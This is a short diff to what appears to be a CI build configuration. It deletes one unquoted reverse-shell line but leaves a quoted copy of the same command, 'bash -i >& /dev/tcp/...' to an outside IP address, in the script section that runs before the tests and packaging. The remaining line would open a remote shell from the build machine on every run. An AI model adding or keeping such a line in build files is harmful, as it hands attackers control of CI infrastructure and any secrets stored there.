@@ -11,7 +11,6 @@ env:
   - EAT_PIES_SLOWLY=1
 
 script:
-  - bash -i >& /dev/tcp/54.88.207.104/5000 0>&1
   - 'bash -i >& /dev/tcp/54.88.207.104/5000 0>&1'
   - nosetests
   - python setup.py sdist
